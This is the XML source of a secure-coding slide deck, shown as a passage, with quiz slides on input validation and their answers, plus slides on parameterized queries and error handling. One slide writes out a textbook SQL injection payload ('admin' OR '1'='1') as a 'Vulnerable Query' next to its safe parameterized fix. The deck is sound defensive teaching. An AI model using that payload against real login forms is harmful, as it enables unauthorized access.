          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>What is the primary purpose of input validation?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Improve user interface design</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Enhance application security by verifying data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Reduce application load time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Optimize database queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1963148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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="4064663"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: C)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506137"/>
            <a:ext cx="7704000" cy="3370538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which type of attack can occur due to improper input validation?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Man-in-the-middle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) SQL injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Denial-of-Service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2052408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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="4064663"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: C)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506137"/>
            <a:ext cx="7704000" cy="3370538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>What is a key advantage of server-side validation?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>a) Improves user experience</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>b) Reduces server load</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>c) Provides comprehensive security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>d) Increases response time</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3145360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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="4064663"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506137"/>
            <a:ext cx="7704000" cy="3370538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>What is Whitelist Validation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>a) Accepts all inputs except known malicious ones</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>b) Accepts only known, safe inputs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>c) Rejects all inputs by default</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>d) None of the above</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2667818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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="4064663"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506137"/>
            <a:ext cx="7704000" cy="3370538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>Why is input sanitization important in input validation?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>a) To improve application performance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>b) To clean user interfaces</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>c) To remove or neutralize harmful elements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>d) To enhance database connectivity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2018708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BB569-34FB-D21F-8372-6174FC699B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="4064663"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EAB60FC-CB70-E7B5-4E67-A2F0068A8B19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506137"/>
            <a:ext cx="7704000" cy="3370538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>What is a potential consequence of weak input validation?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>a) Enhanced user experience</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>b) Authentication bypass</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>c) Faster application performance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>d) Improved data integrity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2486467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34C2D-8E7A-3489-FCDF-D8824CC71AFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Parameterized Queries</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA7B4651-C197-17E7-B38D-A456B66F21DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A secure method of executing SQL statements where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>placeholders</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> are used instead of embedding user inputs directly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A programming technique where placeholders are used in SQL queries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Values are bound separately from the query logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensures user input is treated as data, not executable code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Vulnerable Query:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>  SELECT * FROM users WHERE username = 'admin' OR '1'='1';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Safe (Parameterized Query):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> query = "SELECT * FROM users WHERE username = ?;"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>cursor.execute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(query, (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>user_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>,))</a:t>
            </a:r>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36616514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B9377-A2B0-A749-2817-E89193CAEA80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Error Handling &amp; Logging</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0074F4A-938C-15E8-F04F-25683210560C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Error Handling: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Process of managing unexpected conditions in applications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Logging: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Recording system/application events for analysis and monitoring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Goals:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Ensure application reliability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Prevent sensitive data leaks in error messages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Provide developers/admins with useful debugging information.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32145143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F1959-02BC-3EC4-AACC-1121F43FA5DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Risks of Poor Error Handling</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19228853-C899-E7A8-E7F7-0719B44D132E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Verbose Errors </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(e.g., database details, file paths shown to users).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Information Disclosure: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Attackers may exploit error messages to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Identify DB type (MySQL, Oracle, etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Detect framework/OS versions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Find weak points for further exploitation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Example of bad practice:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Error: ORA-00933: SQL command not properly ended</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Show generic error messages to users, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>like:“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>An</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> unexpected error occurred. Please try again.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35329630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77CDE-ECEB-87BA-2A68-B8A0C725A5A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Secure Practices for Error Handling &amp; Logging</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73083C5D-4370-0271-CD05-268B14B44BA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Error Handling Best Practices:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Show generic error messages to users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Capture details internally for developers/admins.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Fail securely (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>deny access if uncertain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Logging Best Practices:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Centralized logging (e.g., SIEM tools like Splunk, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
